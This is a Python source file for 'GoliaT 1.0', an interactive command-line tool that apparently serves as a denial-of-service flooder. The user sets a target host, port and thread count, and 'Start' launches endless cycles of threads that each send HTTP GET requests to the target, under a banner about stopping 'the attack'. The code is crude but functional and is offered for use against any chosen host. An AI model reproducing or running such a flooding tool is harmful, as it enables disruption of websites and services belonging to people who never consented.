#!/usr/bin/python3


import os

try:
     
   from colorama import Fore,Back, Style, init
   import time
   import platform
   import os
   from threading import Thread

   
   import re
   import requests
   init()
   def clear():
       plat = platform.system().lower()
       
       if(plat == 'linux'):
         os.system('clear')
       if(plat == 'windows'):
         os.system('cls')
       if(plat == 'darwin'):
         os.system('clear')
   clear()
   def time_convert(sec):
     mins = sec // 60
     sec = sec % 60
     hours = mins // 60
     mins = mins % 60
     print("Time Lapsed = {0}:{1}:{2}".format(int(hours),int(mins),sec))

   
   def run_attack( host, port):

      req = requests.get(host)
      


   def start(host,port,threads):

      port = int(port)
      threads = int(threads)
      i = 0
      cycle = 0
      while(i < threads):

         
         t = Thread(target=run_attack, args=(host,port))
         t.start()
         start_time = time.time()
         
         i+=1
         
         
         if(i==threads):

            cycle+=1
            clear()

            print(Fore.RED+'''
                                                                                                     
        ,o888888o.        ,o888888o.     8 8888          8 8888          .8.    8888888 8888888888 
       8888     `88.   . 8888     `88.   8 8888          8 8888         .888.         8 8888       
    ,8 8888       `8. ,8 8888       `8b  8 8888          8 8888        :88888.        8 8888       
    88 8888           88 8888        `8b 8 8888          8 8888       . `88888.       8 8888       
    88 8888           88 8888         88 8 8888          8 8888      .8. `88888.      8 8888       
    88 8888           88 8888         88 8 8888          8 8888     .8`8. `88888.     8 8888       
    88 8888   8888888 88 8888        ,8P 8 8888          8 8888    .8' `8. `88888.    8 8888       
    `8 8888       .8' `8 8888       ,8P  8 8888          8 8888   .8'   `8. `88888.   8 8888       
       8888     ,88'   ` 8888     ,88'   8 8888          8 8888  .888888888. `88888.  8 8888       
        `8888888P'        `8888888P'     8 888888888888  8 8888 .8'       `8. `88888. 8 8888 
   ================================================================================================
         Developed by Dov4n#3720
                      GoliaT 1.0    

                                       Cycles Elapsed
                                             '''+str(cycle)+'''

                                    '''+Fore.YELLOW+'''To stop attack, use Ctrl+C
                                      
         ''')
            
                
            
            time.sleep(2)
            i=0
         
      

   def sets(option,arg1):
      options = ['h','host','p','port','td','threads']
      if(option in options):


         if(option == 'p'):
            if(re.findall('[A-Za-z]',arg1)):
               print(Fore.RED+'(ERROR)Port number MUST be integer')
               return
            f = open('portcfg','w')
            f.write(arg1)
            f.close()
            clear()
            print(Fore.GREEN+'Port set as '+arg1)
            main()
            return

         if(option == 'port'):
            if(re.findall('[A-Za-z]',arg1)):
               print(Fore.RED+'(ERROR)Port number MUST be integer')
               return
            f = open('portcfg','w')
            f.write(arg1)
            f.close()
            

            clear()
            print(Fore.GREEN+'Port set as '+arg1)
            main()
            return

         if(option == 'h'):
            f = open('target','w')
            f.write(arg1)
            f.close()
            clear()
            print(Fore.GREEN+'Target set as '+arg1)
            main()
            return
         if(option == 'host'):
            f = open('target','w')
            f.write(arg1)
            f.close()
            clear()
            print(Fore.GREEN+'Target set as '+arg1)
            main()
            return

         if(option == 'td'):
            if(re.findall('[A-Za-z]',arg1)):
               print(Fore.RED+'(ERROR)Number of threads MUST be integer')
               return
            f = open('threadcount','w')
            f.write(arg1)
            f.close()
            clear()
            print(Fore.GREEN+'Threads set as '+arg1)
            main()
            return
         if(option == 'threads'):
            if(re.findall('[A-Za-z]',arg1)):
               print(Fore.RED+'(ERROR)Number of threads MUST be integer')
               return
            f = open('threadcount','w')
            f.write(arg1)
            f.close()
            clear()
            print(Fore.GREEN+'Threads set as '+arg1)
            main()
            return
      else:
         print('option: '+option+' unknown')

   def helpcmd(cmdhelp):
      print(cmdhelp)


   def main():
      
      print(Fore.RED+'''
                                                                                                     
        ,o888888o.        ,o888888o.     8 8888          8 8888          .8.    8888888 8888888888 
       8888     `88.   . 8888     `88.   8 8888          8 8888         .888.         8 8888       
    ,8 8888       `8. ,8 8888       `8b  8 8888          8 8888        :88888.        8 8888       
    88 8888           88 8888        `8b 8 8888          8 8888       . `88888.       8 8888       
    88 8888           88 8888         88 8 8888          8 8888      .8. `88888.      8 8888       
    88 8888           88 8888         88 8 8888          8 8888     .8`8. `88888.     8 8888       
    88 8888   8888888 88 8888        ,8P 8 8888          8 8888    .8' `8. `88888.    8 8888       
    `8 8888       .8' `8 8888       ,8P  8 8888          8 8888   .8'   `8. `88888.   8 8888       
       8888     ,88'   ` 8888     ,88'   8 8888          8 8888  .888888888. `88888.  8 8888       
        `8888888P'        `8888888P'     8 888888888888  8 8888 .8'       `8. `88888. 8 8888 
   ================================================================================================
   		Developed by Dov4n#3720
                      GoliaT 1.0

                                       Commands Available

                                       Help
                                       Set
                                       Clear
                                       Options
                                       Start
                                       Exit
         ''')



      commands = ['help','helpcmd','set','clear','options','start','exit']
      inputs = input(Fore.YELLOW+'#########'+Fore.CYAN+">").lower()
      if(inputs == ''):
         print(Fore.RED+'(ERROR)Input cannot be empty!')
      if(inputs == ' '):
         print(Fore.RED+'(ERROR)Input cannot be empty!')
      if(inputs == '  '):
         print(Fore.RED+'(ERROR)Input cannot be empty!')
      if(inputs == '   '):
         print(Fore.RED+'(ERROR)Input cannot be empty!')
      if(inputs == '    '):
         print(Fore.RED+'(ERROR)Input cannot be empty!')
      if(inputs == '     '):
         print(Fore.RED+'(ERROR)Input cannot be empty!')

      splitter = inputs.split(' ')

      compare = set(splitter) & set(commands)

      tostr = ''.join(compare)

      if(tostr == 'start'):
         h = open('target','r')
         p = open('portcfg','r')
         td = open('threadcount','r')

         host = str(h.readline())
         port = str(p.readline())
         thread = str(td.readline())
         if(host == ''):
            print(Fore.YELLOW+'(WARNING)You must set the target first. Use help command to get information on how to.')
            return
         if(port == ''):
            print(Fore.YELLOW+'(WARNING)You must set the port first. Use help command to get information on how to.')
            return
         if(thread == ''):
            print(Fore.YELLOW+'(WARNING)You must set the threads first. Use help command to get information on how to.')
            return
         start(host,port,thread)

      if(tostr == 'clear'):
         h = open('target','w')
         p = open('portcfg','w')
         td = open('threadcount','w')

         h.write('')
         p.write('')
         td.write('')

         h.close()
         p.close()
         td.close()
         clear()
         print(Fore.GREEN+'All inputs clear!')
         main()
         


      if(tostr == 'options'):
         h = open('target','r')
         p = open('portcfg','r')
         td = open('threadcount','r')

         print('Host: '+str(h.readline()))
         print('Port: '+str(p.readline()))
         print('Threads: '+str(td.readline()))


      if(tostr == 'help'):
         clear()
         print(Fore.RED+'''
                                                                                                        
           ,o888888o.        ,o888888o.     8 8888          8 8888          .8.    8888888 8888888888 
          8888     `88.   . 8888     `88.   8 8888          8 8888         .888.         8 8888       
       ,8 8888       `8. ,8 8888       `8b  8 8888          8 8888        :88888.        8 8888       
       88 8888           88 8888        `8b 8 8888          8 8888       . `88888.       8 8888       
       88 8888           88 8888         88 8 8888          8 8888      .8. `88888.      8 8888       
       88 8888           88 8888         88 8 8888          8 8888     .8`8. `88888.     8 8888       
       88 8888   8888888 88 8888        ,8P 8 8888          8 8888    .8' `8. `88888.    8 8888       
       `8 8888       .8' `8 8888       ,8P  8 8888          8 8888   .8'   `8. `88888.   8 8888       
          8888     ,88'   ` 8888     ,88'   8 8888          8 8888  .888888888. `88888.  8 8888       
           `8888888P'        `8888888P'     8 888888888888  8 8888 .8'       `8. `88888. 8 8888 
      ================================================================================================
            Developed by Dov4n#3720

                                    General Command Info

                                    Help - Gives this screen you are seeing

                                    Set - Sets (Target|Port|Threads)(H|P|TD)

                                    Clear - Clears the information you entered

                                    Options - Shows the information you setted with "Set"

                                    Start - Starts the attack

                                    Exit - ...Do i really have to tell you what this does?
            ''')





      if(tostr == 'set'):
         
         indexof = splitter.index('set')

         splitter.pop(indexof)

         if('' in splitter):
            indexofspace = splitter.index('')
            splitter.pop(indexofspace)      


         
         sets(splitter[0],splitter[1])


            

            
               
         

   main()


except(ValueError):
   print('(ERROR)Unknown Error')

except(KeyboardInterrupt):
  print('\n(WARNING)Program Stopped By User')

except(IndexError):
   print('(ERROR)Invalid input')

except(ImportError):
   print('(WARNING) Required modules not installed. Do you want to install them?[y/n]')
   opts = ['y','n']
   opt = input('').lower()
   if(opt in opts):
      if(opt == 'y'):
         print('(WARNING) Starting automatic download. Please, do not close your console.')
         os.system('pip install colorama && pip install requests')
      if(opt == 'n'):
         print('(WARNING) Then you cannot run this program.')
   else:
      print(Fore.RED+'Option unknown')
except(requests.exceptions.ConnectionError):
   print(Fore.RED+'(ERROR)Program Timed Out')